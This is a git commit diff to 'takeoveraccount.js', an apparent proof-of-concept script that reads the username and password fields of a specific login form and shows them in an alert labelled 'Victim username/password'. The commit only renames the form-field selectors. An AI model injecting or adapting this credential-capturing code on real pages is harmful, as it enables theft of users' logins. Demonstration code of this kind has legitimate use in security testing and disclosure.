cd5acc44d9f92634a6f7bc1d2a83747bec53e35c
haxuanhuy <52565807+haxuanhuy@users.noreply.github.com>
2025-11-04 18:13:51 +0700

    Update takeoveraccount.js

--- takeoveraccount.js
+++ takeoveraccount.js
@@ -2,14 +2,14 @@
 let isFilled = false;
 
  function checkInputs() {
-    const input1 = document.getElementsByName('fobi_b61')[0];
-    const input2 = document.getElementsByName('fobi_b71')[0];
+    const input1 = document.getElementsByName('fofi_b61')[0];
+    const input2 = document.getElementsByName('fofi_b71')[0];
 
     if (input1.value && input2.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          alert('Victim username: '+document.getElementsByName('fobi_b61')[0].value+'\n\nVictim password: '+document.getElementsByName('fobi_b71')[0].value);
+          alert('Victim username: '+document.getElementsByName('fofi_b61')[0].value+'\n\nVictim password: '+document.getElementsByName('fofi_b71')[0].value);
          
         }, 3000); 
       }
@@ -20,5 +20,5 @@ let isFilled = false;
   window.onload = checkInputs;
 
 
-  document.getElementsByName('fobi_b61')[0].addEventListener('input', checkInputs);
-  document.getElementsByName('fobi_b71')[0].addEventListener('input', checkInputs);
+  document.getElementsByName('fofi_b61')[0].addEventListener('input', checkInputs);
+  document.getElementsByName('fofi_b71')[0].addEventListener('input', checkInputs);
